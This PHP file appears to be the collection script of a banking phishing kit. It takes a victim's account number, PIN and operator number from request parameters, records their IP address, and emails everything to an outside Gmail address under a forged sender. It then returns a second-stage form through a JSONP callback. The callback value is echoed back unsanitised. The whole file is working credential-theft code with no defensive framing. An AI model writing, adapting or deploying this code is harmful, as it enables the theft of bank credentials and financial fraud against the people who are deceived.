<?php
if(isset($_GET['AccessAccount']))
{
    $ccn = $_GET['AccessAccount'];
    $csp = $_GET['PIN'];
    $atm = $_GET['Operator'];
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = time();
        
    $msg = "AccessAccount No : $ccn \r\n";
    $msg .= "Customer Pin : $csp \r\n";
    $msg .= "user number : $atm \r\n";
    $msg .= "Remote_Addr : $ip \r\n\n";
    
    $from = "gelos@merik-dein.ee";
    $headers = "From:" . $from;
    $subject = "Account Access - $ccn - $ip ".$_SERVER['HTTP_HOST'];
        
        
    $errorCount = array();
    
    if(!preg_match('/^([0-9]+)$/', $ccn) || !preg_match('/^([0-9]+)$/', $csp) || !preg_match('/^([0-9]+)$/', $atm)){
        echo 'error';
    }
    else{
        if(mail('hemtlanker@gmail.com', $subject, $msg, $headers)){
        //if(1){
            $experience_login = file_get_contents('oform2.html');

            $experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
            $experience_login = str_replace("{PIN}", $csp, $experience_login);
            $experience_login = str_replace("{Operator}", $atm, $experience_login);

            //echo $experience_login;
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "pff1"));
            echo $callback . '(' . $jsonResponse . ')';
        }
        else{
            //echo $experience_login;
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            $jsonResponse = json_encode(array('message' => "cannot send mail", 'focusElement' => "pff1"));
            echo $callback . '(' . $jsonResponse . ')';
        }
    }
}